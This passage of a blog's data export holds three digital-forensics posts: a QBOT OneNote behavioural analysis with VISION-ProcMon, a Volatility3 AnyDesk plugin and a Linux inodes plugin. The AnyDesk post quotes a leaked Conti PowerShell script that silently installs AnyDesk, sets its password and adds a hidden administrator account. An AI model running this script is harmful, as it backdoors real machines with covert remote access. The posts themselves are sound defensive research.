behavior is very useful to detect future attacks, other compromised equipment, make critical choices and discover new TTPs. In this blog article, we will dive into the behavioral analysis of the latest QBOT campaign using malicious OneNote documents as an initial vector to compromise a host and deploy stealers. This article will demonstrate a use case of VISION-ProcMon for behavioral analysis.","date":"2023-02-27T00:00:00.000Z","tags":[{"inline":true,"label":"Malware Analysis","permalink":"/blog/tags/malware-analysis"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"},{"inline":true,"label":"Procmon","permalink":"/blog/tags/procmon"},{"inline":true,"label":"Qbot","permalink":"/blog/tags/qbot"}],"readingTime":3.22,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"vision","title":"\ud83e\uddec Malware Analysis with VISION-ProcMon","authors":["k1nd0ne"],"tags":["Malware Analysis","Windows","Procmon","Qbot"]},"unlisted":false,"prevItem":{"title":"\ud83d\udd26 Debunking the Expert Witness Compression Format (EWF)","permalink":"/blog/ewf"},"nextItem":{"title":"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk","permalink":"/blog/anydesk"}},"content":"Malware analysis is very useful when performing a digital investigation. Indeed, identifying how a malware works and determining its behavior is very useful to detect future attacks, other compromised equipment, make critical choices and discover new TTPs. In this blog article, we will dive into the behavioral analysis of the latest QBOT campaign using malicious OneNote documents as an initial vector to compromise a host and deploy stealers. This article will demonstrate a use case of VISION-ProcMon for behavioral analysis.\\n\\n**Note:** This blog post is not a complete analysis of the sample but simply demonstrate the capabilities of the tool.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## Behavioral analysis using VISION-ProcMon\\n\\nFor this example, we are performing the analysis of a malicious OneNote document extracted from a phishing email linked to one of the latest QBOT campaign in February 2023. When performing the behavioral analysis of this malicious document, the analyst is usually setting up a lab with tools to record the activities of the system while the malicious activities are performed to analyze them latter. Using the Procmon tool from the Microsoft\u2019s sysinternals, we can capture all the activities of processes running on the victim machine on demand.\\n\\nIf we launch the capture and execute the malicious OneNote document, we will have the details about the processes involved in the infection. When saving the result, we can choose to save the result as a CSV document.\\n\\n\\n![alt text](../images/vision_procmon/7.PNG \\"Vision filtered\\")\\n\\n\\nOnce our export has been made, we can launch VISION-ProcMon and enter the full path of the file to load.\\n![alt text](../images/vision_procmon/1.png \\"Vision main menu\\")\\n\\nOnce our export has been made, we can launch VISION-ProcMon and enter the full path of the file to load.\\n![alt text](../images/vision_procmon/2.png \\"Vision filtered\\")\\n\\nWe can see that the **ONENOTE** process launched the mshta.exe process which is a legitimate Microsoft process used to execute web content outside of a web browser. It can be used to execute JavaScript, VBScripts and other compatible web technologies. In this case we can see that following this process execution, two new processes are created: curl.exe and rundll32.exe which is very suspicious. Before pivoting to those processes, we can check what are the files and registry keys the mshta.exe process interacted with.\\n\\n![alt text](../images/vision_procmon/5.png \\"Vision filtered\\")\\n\\nFirst, we can see that the process read the **Open.hta** file which is in the context of this malware analysis is the malicious HTA executed.\\n\\nNext, we can witness the creation of the malicious registry key **MP3Conv**. Then the **MP3Conv\\\\Cfg** value is set. In the context of the malware analysis, the malicious HTA is saving an encoded javascript function inside this registry key which is then executed. We can also see that the configuration is later deleted to clear tracks.\\n\\n![alt text](../images/vision_procmon/9.png \\"Vision filtered\\")\\n\\nLet\u2019s pivot to the curl.exe process which is the next step after executing the malicious script. The command line associated is interesting because it contains the command used to fetch a malicious DLL on a C2 server disguised as an image.\\n\\n![alt text](../images/vision_procmon/3.png \\"Vision filtered\\")\\n\\nFinally, the script ends by executing the malicious DLL through the rundll32.exe process. We can pivot on the process and witness the command line associated to the execution.\\n\\n![alt text](../images/vision_procmon/4.png \\"Vision filtered\\")\\n\\n## Conclusion\\n\\nVISION-ProcMon is a tool to help the malware analyst in his investigation. This means that it must be used in conjunction with other malware analysis tools (static, dynamic, \u2026). It is also a great way to complete your malware analysis reports by illustrating your explanations with visual examples. You can find the tool here : https://github.com/forensicxlab/VISION-ProcMon\\n\\nDo not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this tool or this article!"},{"id":"anydesk","metadata":{"permalink":"/blog/anydesk","source":"@site/blog/2022-09-30-anydesk/index.md","title":"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk","description":"When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.","date":"2022-09-30T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Anydesk","permalink":"/blog/tags/anydesk"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":12.15,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"anydesk","title":"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","Anydesk","Windows"]},"unlisted":false,"prevItem":{"title":"\ud83e\uddec Malware Analysis with VISION-ProcMon","permalink":"/blog/vision"},"nextItem":{"title":"\ud83d\udce6 Volatility3 Linux Plugin - Inodes","permalink":"/blog/inodes"}},"content":"When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.\\nAnyDesk[^1] is one of those software being extensively used as a sublayer of persistence by threat actors or access other servers in the environment via RDP[^2].\\nThe latter has been often encountered in the wild in the past years as a preferred tool leveraged by known threat actors.\\n\\nAs such, Anydesk should be closely monitored as threat actors could easily alter or delete data after a successful attack; sometimes it is not possible to restore those altered logs. Defending against malicious actions with such remote software can be even more intricate for organizations having approved its legitimate usage.\\nHere we propose to leverage memory forensics to retrieve and analyze artefacts thanks to a custom Volatility plugin that I made available as a free open-source tool for improving digital investigations.\\n\\n[^1]: https://anydesk.com/en\\n[^2]: https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\\n[^3]: https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba\\n[^4]: https://support.anydesk.com/knowledge/trace-files\\n[^5]: https://volatility3.readthedocs.io/en/latest/index.html\\n[^6]: https://twitter.com/debugprivilege/status/1574435608713658368?s=21&t=PWI9kJEpzECxhbyNFR8YUQ\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n***Conti AnyDesk installation tutorial***\\n\\nA striking example came out the last year upon leaked manuals of Conti\u2019s ransomware-as-a-service operators dedicated to its affiliates with pentesting skills[^3].  From this case we can learn how the tool was installed by the attacker using PowerShell.\\n\\n```PowerShell\\n\u0417\u0430\u043a\u0440\u0435\u043f AnyDesk  - \u043e\u0437\u043d\u0430\u043a\u043e\u043c\u0438\u0442\u044c\u0441\u044f \u0432\u0441\u0435\u043c\\n Function AnyDesk {\\n\\n    mkdir \\"C:\\\\ProgramData\\\\AnyDesk\\"\\n    # Download AnyDesk\\n    $clnt = new-object System.Net.WebClient\\n    $url = \\"http://download.anydesk.com/AnyDesk.exe\\"\\n    $file = \\"C:\\\\ProgramData\\\\AnyDesk.exe\\"\\n    $clnt.DownloadFile($url,$file)\\n\\n\\n    cmd.exe /c C:\\\\ProgramData\\\\AnyDesk.exe --install C:\\\\ProgramData\\\\AnyDesk --start-with-win --silent\\n\\n\\n    cmd.exe /c echo J9kzQ2Y0qO | C:\\\\ProgramData\\\\anydesk.exe --set-password\\n\\n\\n    net user oldadministrator \\"qc69t4B#Z0kE3\\" /add\\n    net localgroup Administrators oldadministrator /ADD\\n    reg add \\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\Userlist\\" /v oldadministrator /t REG_DWORD /d 0 /f\\n\\n    cmd.exe /c C:\\\\ProgramData\\\\AnyDesk.exe --get-id\\n\\n    }\\n\\n    AnyDesk\\n```\\n\\nIn this blog post, we will cover which files linked to anydesk are useful and how valuable it can be upon an investigation. Eventually, in the case where an intrusion set is deleting those files using an anti-forensics technique, a volatility3 plugin will be proposed to retrieve that information, which might still reside in memory.\\n\\n## AnyDesk trace files\\nWhen using Anydesk, specific files[^4] are written to trace the activity of the application. There are two files of particular interest:\\n- ad.trace\\n- ad_svc.trace (only at installed version)\\n\\nOn a windows 10 machine, you can respectively find those files in the `%APPDATA%\\\\AnyDesk\\\\` and `%SYSTEMROOT%\\\\ProgramData\\\\AnyDesk\\\\`.\\nHere is an example of data you could find within the log file:\\n\\n***ad.trace content example***\\n```bash\\ninfo 2022-09-27 15:31:53.920       back   3240   5476                   app.backend_session - Starting session (deskrt, clipboard, chat, audio, input, tcp_tunnel).\\ninfo 2022-09-27 15:31:53.920       back   3240   5476                       desk_rt.encoder - 2 segments.\\ninfo 2022-09-27 15:31:53.923       back   3240   5476                     base.monitor_info - Monitors found: 1\\ninfo 2022-09-27 15:31:53.923       back   3240   5476                   app.backend_session - Suspending session start until further notice.\\ninfo 2022-09-27 15:31:53.925       back   3240   5476                   app.backend_session - Continueing session start.\\ninfo 2022-09-27 15:31:53.925       back   3240   5476             desk_rt.capture_component - Starting capture.\\ninfo 2022-09-27 15:31:53.925       back   3240   3892            capture.dda_stream_capture - Initializing D3D.\\ninfo 2022-09-27 15:31:53.926       ctrl   6572   1320                        ad_app.control - Session count: (1, 1)\\ninfo 2022-09-27 15:31:53.927       ctrl   6572   1320                       clipbrd.capture - Registered for clipboard notifications.\\ninfo 2022-09-27 15:31:53.927       ctrl   6572   1320                    app.ctrl_clip_comp - Ready.\\ninfo 2022-09-27 15:31:53.927       ctrl   6572   1320                     win_app.wallpaper - Starting wallpaper.\\ninfo 2022-09-27 15:31:53.948       back   3240   5476             desk_rt.capture_component - Sending screen privacy status: off (no change).\\ninfo 2022-09-27 15:31:53.948       back   3240   5476                        app.mouse_sink - Starting mouse sink.\\ninfo 2022-09-27 15:31:53.950       back   3240   4136             desk_rt.capture_component - Keyboard layout changed to: unknown\\ninfo 2022-09-27 15:31:53.950       back   3240   4136             desk_rt.capture_component - Focused monitor changed: 0 (\\\\\\\\.\\\\DISPLAY1)\\n```\\n\\n***ad_svc.trace content example***\\n```bash\\ninfo 2022-09-27 15:30:44.538       gsvc   9068   5920    1                      app.service - New IPC connection.\\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920    1                  fiber.scheduler - Spawning child fiber 13 (parent 1).\\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Creating an IPC accept socket.\\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Connected to 6572 (control:1).\\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Process login detected.\\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Using existing control (6572).\\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                  fiber.scheduler - Spawning child fiber 14 (parent 13).\\n  info 2022-09-27 15:30:48.601       gsvc   9068   5920    1                      app.service - Process start: 3524 (frontend).\\n  info 2022-09-27 15:30:48.601       gsvc   9068   5920    1           anynet.relay_connector - Short timeouts enabled.\\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920    1                      app.service - New IPC connection.\\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920    1                  fiber.scheduler - Spawning child fiber 15 (parent 1).\\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920   15                      app.service - Creating an IPC accept socket.\\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920   15                      app.service - Connected to 3524 (frontend).\\n  info 2022-09-27 15:30:49.139       gsvc   9068   5920   15                      app.service - Process login detected.\\n  info 2022-09-27 15:30:49.139       gsvc   9068   5920   15                  fiber.scheduler - Spawning child fiber 16 (parent 15).\\n  info 2022-09-27 15:30:50.477       gsvc   9068   5920   15                            gcpsa - Downloading gcapi.dll.\\n error 2022-09-27 15:30:50.518       gsvc   9068   5920   15                 win_app.dir_file - Could not open file (2).\\n  info 2022-09-27 15:30:50.518       gsvc   9068   5920   15                  fiber.scheduler - Spawning child fiber 17 (parent 15).\\n  info 2022-09-27 15:30:50.918       gsvc   9068   5920                       fiber.scheduler - Fiber 17 terminated.\\n  info 2022-09-27 15:30:51.175       gsvc   9068   5920   13                  fiber.scheduler - Spawning child fiber 18 (parent 13).\\n  info 2022-09-27 15:30:51.586       gsvc   9068   5920   15           anynet.main_relay_conn - Reporting system information.\\n  info 2022-09-27 15:30:52.221       gsvc   9068   5920                       fiber.scheduler - Fiber 18 terminated.\\n  info 2022-09-27 15:31:31.131       gsvc   9068   5920    4                  fiber.scheduler - Spawning root fiber 19.\\n  info 2022-09-27 15:31:31.131       gsvc   9068   5920   19            anynet.connection_mgr - [192.168.164.130:49152] Incoming connection.\\n  info 2022-09-27 15:31:31.147       gsvc   9068   5920   19                  fiber.scheduler - Spawning root fiber 20.\\n  info 2022-09-27 15:31:31.272       gsvc   9068   5920   19                  fiber.scheduler - Spawning root fiber 21.\\n  info 2022-09-27 15:31:31.287       gsvc   9068   5920   19                        handshake - Using protocol version 1.\\n  info 2022-09-27 15:31:31.287       gsvc   9068   5920   19            anynet.connection_mgr - [192.168.164.130:49152] Direct connection.\\n  ```\\n\\nWe can see that it is possible to extract useful artifacts.\\nHereby is a non-exhaustive list:\\n- AnyDesk version\\n- The IP address of the AnyDesk relay used when initiating a connection\\n- Timestamps of each action\\n- Listening port\\n- Incoming connection IP address\\n- Involved PIDs\\n- Number of monitors found\\n- Install date\\n\\n## The anti-forensics scenario\\nIf the adversary is aware of those artifacts, he might delete those files. However, there is still a chance to retrieve those cached files in memory!\\nIn this example, our is setup is 2 windows 10 virtual machine (**A** and **B**). **A** (attacker) is initiating a remote anydesk connection to **B** (victim).\\nAfter a while the session is disconnected and A deleted the ad.trace and ad_svc.trace files.\\nNext, a memory dump of machine **B** is performed, ready to be analyzed.\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/anydesk/scenario.png \\"Investigation scenario\\")\\n</div>\\n\\n\\n## Writing a Volatility3 plugin\\nUsing volatility3[^5] we can write a custom plugin which will perform the following steps :\\n\\n- Look for ad.trace and ad_svc.trace using the filescan plugin;\\n- Try to dump the files if found;\\n- Parse the files and render the data to the investigator.\\n\\nIndeed, we could just dump the file and analyze it offline. However, writing a dedicated plugin is useful to:\\n- Interface with the Timeliner plugin and make timestamps correlation with other artifacts;\\n- Interface with any other tools that are exploiting the other volatility3 output capabilities (json, csv, ...).\\n\\n***Plugin output example***\\n```bash\\n~/work/DFIR/Memory Analysis/MemoryImages/Windows10_AnyDesk \xbb vol -f Windows_AD.vmem anydesk\\nVolatility 3 Framework 2.0.1\\nProgress:  100.00\\t\\tPDB scanning finished\\nSource\\tType\\tTime\\tContext\\tMessage\\n[...]\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:14:32.854000 \\tgsvc\\tMain relay connection established.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:14:32.854000 \\tgsvc\\tNew user data. Client-ID: 684537884.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\terror\\t2022-09-30 19:14:32.954000 \\tgsvc\\tpacket-type(60)\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.766000 \\tgsvc\\tSpawning root fiber 37.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.766000 \\tgsvc\\t[192.168.164.130:52257] Incoming connection.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.766000 \\tgsvc\\tSpawning root fiber 38.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.867000 \\tgsvc\\tSpawning root fiber 39.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.867000 \\tgsvc\\tUsing protocol version 1.\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.867000 \\tgsvc\\t[192.168.164.130:52257] Direct connection.\\n[...]\\n\\\\ProgramData\\\\AnyDesk\\\\ad_svc.trace\\tinfo\\t2022-09-30 19:37:36.926000 \\tgsvc\\tBackend PID: 1268\\n[...]\\n```\\n\\n***Using the timeliner plugin***\\n```\\n[...]\\nAnydesk\\tAnyDesk: info Fiber 20 terminated.  \\t2022-09-27 15:30:21.968000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info Fiber 20 terminated.  \\t2022-09-27 15:30:21.968000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info Starting installation of AnyDesk.  \\t2022-09-27 15:30:35.484000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info Opening UAC dialog.  \\t2022-09-27 15:30:35.484000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info line: \\"C:\\\\Users\\\\Volatility\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\TempState\\\\Downloads\\\\AnyDesk (1).exe\\" --install \\"C:\\\\Program Files (x86)\\\\AnyDesk\\"  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf \\"C:\\\\Users\\\\Volatility\\\\AppData\\\\Roaming\\\\AnyDesk\\\\service.conf\\"  --sys-conf \\"C:\\\\Users\\\\Volatility\\\\AppData\\\\Roaming\\\\AnyDesk\\\\system.conf\\"  \\t2022-09-27 15:30:35.484000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info Starting installation of AnyDesk.  \\t2022-09-27 15:30:35.484000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info Opening UAC dialog.  \\t2022-09-27 15:30:35.484000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info line: \\"C:\\\\Users\\\\Volatility\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\TempState\\\\Downloads\\\\AnyDesk (1).exe\\" --install \\"C:\\\\Program Files (x86)\\\\AnyDesk\\"  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf \\"C:\\\\Users\\\\Volatility\\\\AppData\\\\Roaming\\\\AnyDesk\\\\service.conf\\"  --sys-conf \\"C:\\\\Users\\\\Volatility\\\\AppData\\\\Roaming\\\\AnyDesk\\\\system.conf\\"  \\t2022-09-27 15:30:35.484000 \\tN/A\\tN/A\\tN/A\\nSymlinkScan\\tSymlink: Global -> \\\\BaseNamedObjects\\t2022-09-27 15:30:37.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 380 svchost.exe Loaded rsaenh.dll (C:\\\\Windows\\\\system32\\\\rsaenh.dll) Size 208896 Offset 140735643516928\\t2022-09-27 15:30:40.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 380 svchost.exe Loaded CRYPTBASE.dll (C:\\\\Windows\\\\System32\\\\CRYPTBASE.dll) Size 49152 Offset 140735649873920\\t2022-09-27 15:30:40.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 3680 explorer.exe Loaded LINKINFO.dll (C:\\\\Windows\\\\SYSTEM32\\\\LINKINFO.dll) Size 53248 Offset 140735555567616\\t2022-09-27 15:30:41.000000 \\tN/A\\tN/A\\tN/A\\nPsList\\tProcess: 9068 AnyDesk.exe (221603241440448)\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nPsList\\tProcess: 9068 AnyDesk.exe (221603241440448)\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nPsScan\\tProcess: 9068 AnyDesk.exe (221603241440448)\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nPsScan\\tProcess: 9068 AnyDesk.exe (221603241440448)\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 380 svchost.exe Loaded SHELL32.dll (C:\\\\Windows\\\\System32\\\\SHELL32.dll) Size 21954560 Offset 140735700271104\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 3680 explorer.exe Loaded EhStorShell.dll (C:\\\\Windows\\\\System32\\\\EhStorShell.dll) Size 225280 Offset 140735394414592\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 9068 AnyDesk.exe Loaded AnyDesk.exe (C:\\\\Program Files (x86)\\\\AnyDesk\\\\AnyDesk.exe) Size 16338944 Offset 19005440\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 9068 AnyDesk.exe Loaded <volatility3.framework.renderers.UnreadableValue object at 0x1464d7520> (<volatility3.framework.renderers.UnreadableValue object at 0x1464d7520>) Size 2019328 Offset 140735723339776\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 9068 AnyDesk.exe Loaded wow64.dll (C:\\\\Windows\\\\System32\\\\wow64.dll) Size 339968 Offset 140735698370560\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 9068 AnyDesk.exe Loaded wow64win.dll (C:\\\\Windows\\\\System32\\\\wow64win.dll) Size 507904 Offset 140735699550208\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nDllList\\tDLL Load: Process 9068 AnyDesk.exe Loaded wow64cpu.dll (C:\\\\Windows\\\\System32\\\\wow64cpu.dll) Size 36864 Offset 2002452480\\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nNetScan\\tNetwork connection: Process 9068 AnyDesk.exe Local Address 0.0.0.0:7070 Remote Address 0.0.0.0:0 State LISTENING Protocol TCPv4 \\t2022-09-27 15:30:42.000000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info * AnyDesk Windows Startup *  \\t2022-09-27 15:30:42.636000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info * Version 7.0.14 (release/win_7.0.x 5cf8483107cd52198359a9504e0641fbe8cc59b3)  \\t2022-09-27 15:30:42.636000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info * Custom Client (no ID)  \\t2022-09-27 15:30:42.636000 \\tN/A\\tN/A\\tN/A\\nAnydesk\\tAnyDesk: info * Checksum 1b8e6bc34e8cd533b5d7281935ff2761  \\t2022-09-27 15:30:42.636000 \\tN/A\\tN/A\\tN/A\\n```\\n\\n\\n\\n## Conclusion\\n\\nThis plugin was tested on Windows 10 memory dumps and the code can be found on the forensicxlab github : https://github.com/forensicxlab/volatility3_plugins.\\nI would like to thank @DebugPrivilege for the tweet[^6] he made about the subject that gave me the idea to write this plugin.\\n\\nAnyDesk is only one of the techniques used by threat actors to establish persistence via remote access. It is possible that other posts of the same type dealing with RA tools like \\"Atera\\" will come out in a few weeks.\\n\\nIt will be submitted to the volatility3 foundation for integration to the framework. You should Identify each steps described before in the source code comments.\\nDo not hesitate to reach me at felix.guyard@forensicxlab.com, or to make a pull-request on the repository to enhance this plugin or this article.\\n\\nHappy Hunting!"},{"id":"inodes","metadata":{"permalink":"/blog/inodes","source":"@site/blog/2022-09-14-inodes/index.md","title":"\ud83d\udce6 Volatility3 Linux Plugin - Inodes","description":"The filesystem is one of the most basic and important concepts in UNIX/Linux. This concept is working around the idea that \u201ceverything is a file\u201d, meaning that the hardware, regular files, directories, sockets, kernel data structures, process communications etc are represented as files with their own types. On a filesystem, a file (whatever its type) is assigned with a number called an \\"inode\\". An inode is an interface between the blocks on the filesystem and the file.","date":"2022-09-14T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"VFS","permalink":"/blog/tags/vfs"},{"inline":true,"label":"Inodes","permalink":"/blog/tags/inodes"},{"inline":true,"label":"Linux","permalink":"/blog/tags/linux"}],"readingTime":8.48,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"inodes","title":"\ud83d\udce6 Volatility3 Linux Plugin - Inodes","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","VFS","Inodes","Linux"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk","permalink":"/blog/anydesk"},"nextItem":{"title":"\ud83d\udce6 Volatility3 Windows Plugin - Prefetch","permalink":"/blog/prefetch"}},"content":"The filesystem is one of the most basic and important concepts in UNIX/Linux. This concept is working around the idea that \u201ceverything is a file\u201d, meaning that the hardware, regular files, directories, sockets, kernel data structures, process communications etc are represented as files with their own types. On a filesystem, a file (whatever its type) is assigned with a number called an \\"**inode**\\". An inode is an interface between the blocks on the filesystem and the file.\\n\\nWhen a process is running, it is interacting with the hardware, the kernel, the user\u2019s resources etc, therefore opening the required files. Linux is keeping track of the opened files inodes in memory by using the **Virtual File System** (VFS) and more precisely the **directory entry cache** (dentry). In this article, I will present how you can extract inode metadata from a modern Linux memory image using the volatility3 framework.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Linux memory analysis\\n\\nWhen performing memory forensics on a Linux memory image, the fact that a lot of distribution exist is making the memory analysis with volatility3 trickier. Volatility3 is basically trying to identify known structures in memory to create python objects that can be exploited. The framework needs **symbol tables** to be able to know where to find these structures and how they are defined. For example, to identify the structures inside a x64 Intel based Linux Debian machine memory dump, you\'ll need:\\n\\n- To find the kernel debugging symbols generated at compilation time matching the kernel version.\\n- Convert the debugging symbols into symbol tables understandable by volatility3.\\n- Work with the framework to identify and extract structures from memory and get your artifacts.\\n\\nYou can learn more about theses steps here : https://volatility3.readthedocs.io/en/latest/symbol-tables.html\\n\\nThis process is easier for Windows and Mac because there is \\"one distribution\\" per OS. However, the fact that a lot of distributions for Linux exists makes this task more difficult.\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/inodes/KDS.png \\"Kernel Debugging Symbols\\")\\n</div>\\n\\n\\n## Inode forensics value in memory\\n\\nIf you have ever performed digital forensic on a post-mortem Linux investigation, you may know that the inode structure on disk varies depending on the type of filesystem used. For example, Debian is by default using **ext4** filesystem whereas Fedora is using **XFS** and CentOS is using **btrfs**.\\n\\nHowever, the fact that we are performing our analysis in memory, we are talking about extracting inode objects contained in the **directory entry cache** (dentry) from the **Virtual File System** (VFS). The VFS is an abstraction of the filesystem within the kernel which allows coexistence between the different type encountered. The fact that dentries are living in RAM and are never saved to the disk is giving us new useful forensics artifacts that may not be found on a classic \u201cdead system\u201d.\\n\\nWhen a process is opening files, it is storing a list of file descriptors. Each file descriptor (fd) is a pointer to a structure containing the dentry cache. We can extract the file inode from this structure and get access to its metadata which are very useful forensics artifacts. We can retrieve the following:\\n- File size in bytes (i_size)\\n- File permissions (i_mode)\\n- Last modification time (mtime)\\n- Last changed time (ctime)\\n- Last access time (atime)\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/inodes/dentry.png \\"How to get the dentry\\")\\n</div>\\n\\n\\n\\n\\n## The Volatility3 inode plugin\\n\\nTo be able to extract inode metadata from memory we can identify those major steps:\\n\\n- Go through each process using the **pslist** plugin.\\n- For each process, extract the list of file descriptors using code from the **lsof** plugin.\\n- For each file descriptor, extract the cached dentries, parse the inode metadata and return the result.\\n\\nAs a result, the plugin is extracting all of the inode metadata needed to help us during our investigation (we like timestamps !).\\n```\\n~/work/DFIR/Memory Analysis/MemoryImages/debian 5.10.0-18-amd64 \xbb vol -f Debian\\\\ XFS.vmem -s symbols linux.inodes\\nVolatility 3 Framework 2.0.1\\nProgress:  100.00\\t\\tStacking attempts finished\\nPID\\tProcess\\tInode\\tMode\\tFile\\tLastChange\\tLastModify\\tLastAccessed\\tSize\\n...\\n2555\\tfirefox-esr\\t52709413\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/places.sqlite-wal\\t2022-09-11 22:05:11.000000 \\t2022-09-11 22:05:11.000000 \\t2022-09-11 22:05:12.000000 \\t2164304\\n2555\\tfirefox-esr\\t34057200\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite-wal\\t2022-09-11 22:05:04.000000 \\t2022-09-11 22:05:04.000000 \\t2022-09-11 22:05:04.000000 